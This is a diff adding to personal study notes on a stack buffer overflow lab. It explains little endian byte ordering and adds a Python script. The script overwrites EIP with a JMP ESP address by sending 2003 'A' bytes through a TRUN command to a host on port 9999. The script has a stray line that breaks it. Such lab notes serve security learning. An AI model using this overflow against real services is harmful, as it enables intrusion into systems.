@@ -796,12 +796,45 @@ while True:
             
         - This **"Special Reverse"** actually is called technically `little endian format` whic is used when we "talk" with `x86 Architecture`
         
-        - This means, `x86 Architecture` actually stores the low order byte at the lowest address and the hugh order byte at the highest address. So we need to put it in reverse order...
+        - This means, `x86 Architecture` actually stores the **low order byte at the lowest address** and the **high order byte at the highest address**. So we need to put it in reverse order...
         
-        - 
+            - What this should do now is this should throw the same "air" before, but it's going to hit a `jump point`.
+            
+            - We can do something special in `Immunity Debugger` to actually catch this.
+            
+                - So, we will save our new script then:
+                
+```python
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+        # Remember x86 Architecture:
+
+    # Original = `625011AF`
+    # Spaced   = `62 50 11 AF`
+    # Reversed = `AF 11 50 62`
+    # Final    = "\xAF\x11\x50\x62"
+
+625011AF
+
+shellcode = "A" * 2003 + "\xAF\x11\x50\x62"
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.100', 9999))
+                
+                s.send(('TRUN /.:/' + shellcode))
+                s.close()
+        
+        except:
+                print "Error connecting to server"
+                sys.exit()
+```
   
         
-    - 
+
          
 
     
